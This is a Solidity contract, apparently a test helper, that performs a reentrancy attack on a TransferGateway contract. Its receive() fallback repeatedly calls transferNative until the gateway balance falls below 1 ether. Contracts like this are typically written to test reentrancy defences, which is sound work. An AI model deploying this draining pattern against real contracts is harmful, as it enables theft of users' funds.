// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../TransferGateway.sol";

contract ReentrancyAttack {
    TransferGateway public gateway;

    constructor(address gatewayAddress) {
        gateway = TransferGateway(gatewayAddress);
    }

    receive() external payable {
        if (address(gateway).balance >= 1 ether) {
            gateway.transferNative(payable(address(this)));
        }
    }

    function attack() external payable {
        gateway.transferNative{value: msg.value}(payable(address(this)));
    }

    function deposit() external payable {
        // Deposit funds to the contract
    }
}
